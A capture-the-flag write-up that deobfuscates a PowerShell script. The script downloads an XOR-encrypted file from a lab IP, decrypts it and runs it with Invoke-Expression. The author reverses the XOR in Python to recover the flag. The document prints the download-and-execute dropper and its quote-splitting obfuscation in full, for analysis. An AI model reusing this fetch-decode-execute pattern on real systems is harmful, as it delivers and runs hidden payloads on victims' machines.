## Solution

we recieve a .txt and .ps1 file, opening the .ps1 gives an obfuscated script:
```
$09c5b699434943b6b9a9ada620495bcb = "http://192.168.126.148:8000/encrypted_flag.txt"

# get user's download path
$5a7e4a282bb7448fb7b5bfa39a35b0df = (Ne''w-Ob""jec''t -ComObject Shell.Application).Namespace('shell:Downloads').Self.Path
$50d397a584b6474e93f705a6502224c8 = "encrypted_flag.txt"
$6b8778b7cc704ee2a75b106c2bea9282 = $5a7e4a282bb7448fb7b5bfa39a35b0df + "\" + $50d397a584b6474e93f705a6502224c8

# check if the encrypted flag exist or not in Download folder
if(![System.IO.File]::Exists($6b8778b7cc704ee2a75b106c2bea9282)){
    # download file
    In''vok''e-Web""Requ""est $09c5b699434943b6b9a9ada620495bcb -OutFile $6b8778b7cc704ee2a75b106c2bea9282
}

#$decrypt the flag
function ded7e27bbf454228bcb53129ac07b6d1 {
    $ec27c22d9dfc41e2b8c1496ba437021c = ""
    $f61e225cfe1d484981de4988b40df8b4 = G''et-Co''ntent -Path $6b8778b7cc704ee2a75b106c2bea9282 -Raw
    $339a18cced14be6bc35c6e7df638925 = 73
    foreach ($char in $f61e225cfe1d484981de4988b40df8b4.ToCharArray()) {
        $7f1796cab4f94bd5a96ef19bf913ef66 = [int][char]$char
        $1add7cad15f14b6ca981d83ac36d224e = [char]($7f1796cab4f94bd5a96ef19bf913ef66 -bxor $339a18cced14be6bc35c6e7df638925)
        $ec27c22d9dfc41e2b8c1496ba437021c += $1add7cad15f14b6ca981d83ac36d224e
    }
    return $ec27c22d9dfc41e2b8c1496ba437021c
}

$kjNWZnpBQXanwb5JSm23LrhXqgs6petg = ded7e27bbf454228bcb53129ac07b6d1

# execute the payload
I''nvoke-Expr''ess""ion $kjNWZnpBQXanwb5JSm23LrhXqgs6petg
```

after some basic cleaning and remapping, we can get a cleaner code:
```
$weblink = "http://192.168.126.148:8000/encrypted_flag.txt"

# get user's download path
$downloadpath = (New-Object -ComObject Shell.Application).Namespace('shell:Downloads').Self.Path
$encryptedflagpath = "encrypted_flag.txt"
$filepath = $downloadpath + "\" + $encryptedflagpath

# check if the encrypted flag exist or not in Download folder
if(![System.IO.File]::Exists($filepath)){
    # download file
    Invoke-WebRequest $weblink -OutFile $filepath
}

#$decrypt the flag
function decrypt-flag {
    $result = ""
    $content = Get-Content -Path $filepath -Raw
    $key = 73
    foreach ($char in $content.ToCharArray()) {
        $ascii = [int][char]$char
        $decoded = [char]($ascii -bxor $key)
        $result += $decoded
    }
    return $result
}

$decryptexpression = decrypt-flag

# execute the payload
Invoke-Expression $decryptexpression
```
So basically the code gets the file, and for each chr, it turns into ascii, xor with the key(73) then turns back into chr.
Since XOR is a symmetric operation, we just need to XOR the same txt file with the same key to get the original flag:
```
key = 73
with open ("encrypted_flag.txt", "r") as f:
    content = f.read()
    result = ""
    for char in content:
        ascii = ord(char)
        decoded = chr(ascii ^ key)
        result += decoded
    print(result)

-->
$flag = "pecan{0bfusc4t3d_c0d3_st111_w0rks_682374}"
echo $flag
$5988c690d1b24122b6c38d3722a93c49 = New-''Obj...
```
answer:
```
pecan{0bfusc4t3d_c0d3_st111_w0rks_682374}
```
